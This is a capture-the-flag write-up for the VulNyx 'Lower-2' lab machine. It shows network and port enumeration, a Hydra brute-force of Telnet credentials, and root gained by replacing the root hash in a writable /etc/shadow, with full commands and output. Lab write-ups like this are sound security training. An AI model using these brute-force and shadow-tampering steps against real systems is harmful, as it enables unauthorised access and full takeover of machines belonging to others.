# [VulNyx](https://vulnyx.com/): Lower-2 Machine Writeup  

<img width="831" height="518" alt="image" src="https://github.com/user-attachments/assets/3144ad3d-cc49-44ce-a232-1f8a448a3248" />

---

# 🎯 Target Information

- **Platform:** VulNxy.com  
- **Machine Name:** Lower-2  
  
- **Key Vulnerabilities:**
  - Weak Telnet Credentials
  - Information Disclosure
  - Writable `/etc/shadow`
  - Privilege Escalation via Password Hash Modification

---

# 🔍 Network Discovery

Initially, scan the local network using `arp-scan` to identify active hosts.

```bash
$ sudo arp-scan  --localnet               
[sudo] password for arc: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8d:a8:e2, IPv4: 192.168.29.56
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.29.4    f6:ad:e9:27:6f:23       (Unknown: locally administered)
192.168.29.1    d8:78:c9:bd:6b:b7       (Unknown)
192.168.29.222  00:0c:29:3f:fd:73       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 3 responded

```

The target machine IP address was identified as:

```text
192.168.29.222
```

---

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan:

```bash
$ nmap -n -Pn -sSV -p- --min-rate 5000  192.168.29.222 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 02:51 -0700
Nmap scan report for 192.168.29.222
Host is up (0.0047s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
23/tcp open  telnet  Netkit telnet-ssl telnetd
80/tcp open  http    nginx 1.22.1
MAC Address: 00:0C:29:3F:FD:73 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.30 seconds
```

### Findings
- Port **22** → SSH
- Port **23** → Telnet
- Port **80** → HTTP

---

# 🌐 Web Enumeration

Open port 80 in the browser.

<img width="1292" height="447" alt="image" src="https://github.com/user-attachments/assets/ce1968e7-d70e-4561-9f85-028e42b06cec" />

### Observation

The website displayed the default Nginx page:

```text
It works!
```

This indicates the web service is active but does not expose any useful content.

---

# 📂 Directory Enumeration

Use Gobuster to search for hidden directories:

```bash
$ gobuster dir -u http://192.168.29.222/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.29.222/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 141707 / 141707 (100.00%)
===============================================================
Finished
===============================================================
```

## Result

No directories were discovered.

---

# 🔐 Telnet Enumeration

Attempt login with common default credentials:

```text
admin/admin
root/root
admin/password
```

## Result

```
$ telnet 192.168.29.222
Trying 192.168.29.222...
Connected to 192.168.29.222.
Escape character is '^]'.

lower2 login: admin
Password: 

Login incorrect
lower2 login: root
Password: 

Login incorrect
lower2 login: Connection closed by foreign host.
```
All login attempts failed.

---

# 🔍 SSH Enumeration

Attempt an SSH connection:

```bash
$ ssh 192.168.29.222
The authenticity of host '192.168.29.222 (192.168.29.222)' can't be established.
ED25519 key fingerprint is: SHA256:4K6G5c0oerBJXgd6BnT2Q3J+i/dOR4+6rQZf20TIk/U
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.29.222' (ED25519) to the list of known hosts.

###################################################
### Welcome to Brian Taylor's (b.taylor) server ###
###################################################

arc@192.168.29.222: Permission denied (publickey).
```

## Banner Information

```text
Welcome to Brian Taylor's (b.taylor) server
```

### Important Findings
- Username identified:
```text
b.taylor
```

- SSH authentication method:
```text
publickey
```

This indicates password authentication is disabled for SSH.

---

# 🔓 Telnet Brute Force

Use Hydra to brute-force the Telnet service:

```bash
$ hydra -l b.taylor -P /usr/share/wordlists/rockyou.txt telnet://192.168.29.222 -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-10 03:03:36
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking telnet://192.168.29.222:23/
[23][telnet] host: 192.168.29.222   login: b.taylor   password: rockyou
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-10 03:03:50

```

## Credentials Found

```text
Username: b.taylor
Password: rockyou
```

---

# 🖥 Initial Access

Login through Telnet:

```bash
$ telnet 192.168.29.222 
Trying 192.168.29.222...
Connected to 192.168.29.222.
Escape character is '^]'.

lower2 login: b.taylor
Password: 
Last login: Sun May 10 17:33:47 CEST 2026 from 192.168.29.56 on pts/22

b.taylor@lower2:~$
```

## Verify User

```bash
b.taylor@lower2:~$ id ; hostname
uid=1000(b.taylor) gid=1000(b.taylor) grupos=1000(b.taylor),42(shadow)
lower2
```

Successfully gained access as user `b.taylor`.

---

# ⚠️ Critical Group Membership

The user belongs to the `shadow` group:

```text
42(shadow)
```

This group has permission to access `/etc/shadow`.

---

# 🔍 Searching for Writable Files

Search for writable files that may help with privilege escalation:

```bash
b.taylor@lower2:~$ find / -type f -writable 2</dev/null | grep -ivE "proc|var|sys|home"
/etc/shadow
```

This is a critical misconfiguration because `/etc/shadow` stores password hashes.

---

# 🔑 Extracting Root Password Hash

View the root user's hash:

```bash
b.taylor@lower2:~$ cat /etc/shadow | head -1
```

## Result

```text
root:$y$j9T$RDW/7EgA4sElvqxLVk.Uo.$OmF5Lm4Ub/UeC2ua6tTQnHB07WKpYs1lOXl.lS581q8
```

---

# 🔐 Generating a New Password Hash

Generate a new password hash using OpenSSL:

```bash
b.taylor@lower2:~$ openssl passwd -1 123456
$1$MrhCahom$tzh7m6/bU0NW1YNU6uqtS.
```

## New Password Hash

```text
$1$MrhCahom$tzh7m6/bU0NW1YNU6uqtS.
```

---

# ✏️ Modifying `/etc/shadow`

Edit the `/etc/shadow` file using `nano`and replace the existing root password hash with the newly generated hash.

## Modified Entry

```text
root:$1$MrhCahom$tzh7m6/bU0NW1YNU6uqtS.:20134:0:99999:7:::
```

Save the file and exit.

---

# 👑 Privilege Escalation

Switch to the root user:

```bash
su -
```

Enter password:

```text
123456
```

## Verification

```bash
root@lower2:~# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
lower2
```

Successfully escalated privileges to root.

---

# 🏁 Flags

## Locate Flags

```bash
root@lower2:~# find / -name root.txt -o -name user.txt 2</dev/null
/root/root.txt
/home/b.taylor/user.txt
```

---

# 📄 User Flag

```bash
root@lower2:~# cat /home/b.taylor/user.txt
```

```text
edc9f5c55af87505033a20***********
```

---

# 👑 Root Flag

```bash
root@lower2:~# cat /root/root.txt
```

```text
235aa90b688b711a87d5d1***********
```

---

# 🧾 Summary

| Phase | Technique |
|------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| Web Enumeration | Gobuster |
| Information Disclosure | SSH Banner |
| Credential Attack | Hydra |
| Initial Access | Telnet |
| Privilege Escalation | Writable `/etc/shadow` |

---

# 🚀 Key Takeaways

- Service banners can leak valid usernames.
- Telnet remains highly insecure and vulnerable to brute-force attacks.
- Membership in the `shadow` group is extremely dangerous.
- Writable `/etc/shadow` leads directly to full system compromise.
- Misconfigured permissions are often enough for privilege escalation.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
